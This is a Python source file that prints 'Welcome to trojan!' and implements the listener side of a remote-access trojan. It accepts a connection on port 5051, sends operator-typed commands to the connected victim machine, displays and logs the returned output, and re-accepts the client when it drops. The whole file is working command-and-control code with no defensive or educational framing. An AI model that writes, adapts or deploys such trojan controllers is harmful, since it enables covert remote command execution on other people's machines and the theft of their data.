import socket
import colorama

colorama.init(autoreset=True)

def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    return s.getsockname()[0]


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
HOST = get_local_ip()
PORT = 5051
SERVER = (HOST, PORT)
FORMAT = "utf-8"
BUFFER = 8192
DC_MSG = "!dc"

print("#"*32)
print("###### Welcome to trojan! ###### ")
print("#"*32)
print(f"{colorama.Style.DIM}Waiting for incomming connections...", end=" ")

s.bind(SERVER)
s.listen()
client, addr = s.accept()
print(f"{colorama.Fore.GREEN}\nConnected from: {addr}")

logs = open("./logs.log", "a")
run = True
while run:
    try:
        cmd = ""
        while cmd == "":
            cmd = input(colorama.Fore.CYAN + ">>> " + colorama.Fore.RESET)

        client.send(cmd.encode(FORMAT))

        if cmd == DC_MSG:
            print(f"{colorama.Fore.RED}Disconnected...")
            logs.close()
            run = False
            s.close()
            break
        if cmd == "\n": 
            continue
        msg = client.recv(BUFFER).decode(FORMAT)
        print(msg)
        logs.write(f"{colorama.Style.BRIGHT}Executable command: {cmd}\n")
        logs.write(msg)
    except KeyboardInterrupt:
        print(f"{colorama.Fore.RED}\nDisconnected...")
        logs.close()
        run = False
        s.close()
    except:
        print(f"{colorama.Fore.RED}Client lost... reconnected")
        client, addr = s.accept()
        print(f"{colorama.Fore.GREEN}Connected from: ", addr)
